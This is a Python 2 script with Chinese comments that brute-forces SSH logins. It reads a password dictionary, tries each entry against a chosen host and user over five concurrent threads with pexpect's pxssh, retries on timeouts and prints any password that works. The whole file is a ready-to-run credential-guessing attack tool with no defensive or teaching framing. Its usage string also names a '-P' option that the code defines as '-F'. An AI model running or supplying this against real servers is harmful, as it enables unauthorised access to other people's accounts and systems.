#!/usr/bin/python
#coding=utf-8
import pexpect.pxssh
import optparse
import time
import threading

Found=False
Fails=0
Lock=threading.BoundedSemaphore(5)
#连接ssh如果没有异常，连接成功，表示密码正确
def connect(targetHost,user,password,release):
    global Found
    global Fails
    try:
        #进行登陆
        s=pexpect.pxssh.pxssh()
        s.login(targetHost,user,password,login_timeout=100)
        Found=True
        print '密码已经发现是：%s' % password
    except Exception,e:
        #出现'read_nonblocking'表示连接超时，连接超时失败次数加１，等待一段时间重连
        if 'read_nonblocking' in str(e):
            Fails+=1
            time.sleep(10)
            connect(targetHost,user,password,False)#False参数，表示递归调用connecct,不解锁
        #出现'synchronize with original prompt'命令提示符提取困难，再试一次
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(targetHost,user,password,False)#False参数，表示递归调用connecct,不解锁
    finally:
        if release:#不是递归调用，解锁
            Lock.release()

#第一步
def main():
    #从命令行获取参数
    parse=optparse.OptionParser('格式：-Hlocalhost -Uroot -PpasswordFile')
    parse.add_option('-H',dest='targetHost',type='string',help='网站地址')
    parse.add_option('-U',dest='user',type='string',help='用户名')
    parse.add_option('-F',dest='pwdFile',type='string',help='密码字典')
    (options,args)=parse.parse_args()
    targetHost=options.targetHost
    user=options.user
    pwdFile=options.pwdFile
    print targetHost,user,pwdFile
    #读取字典
    try:
        pwdF=open(pwdFile,'r')
    except:
        print '读取字典失败'
        return
    #遍历读取到的密码列表
    for line in pwdF.readlines():
        password=line.strip('\n')
        #如果发现密码程序停止
        if Found:
            print '密码已经被发现'
            exit(0)
        #如果超时次数太多，程序停止
        if Fails:
            print '超时次数太多'
            exit(0)
        #加锁，保证每次只有固定次数的密码在连接
        Lock.acquire()
        print '测试密码：%s' % password
        #线程调用连接
        t=threading.Thread(target=connect,args=(targetHost,user,password,True))
        t.start()


if __name__ == '__main__':
    main()